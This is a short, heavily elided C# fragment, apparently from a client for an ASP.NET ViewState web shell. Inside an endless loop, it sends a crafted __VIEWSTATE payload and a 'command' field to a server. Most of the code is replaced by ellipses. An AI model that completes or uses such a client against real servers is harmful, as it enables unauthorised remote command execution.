        ...
        public static void Main(string[] args)
        {
            ...
            {            
                ...
                while (true)
                {
                    ...
                    hwr.Proxy = null;
                    byte[] post = Encoding.UTF8.GetBytes("__VIEWSTATE="+HttpUtility.UrlEncode(data2)+"&__VIEWSTATEGENERATOR="+generator+"&__Value="+HttpUtility.UrlEncode(command));
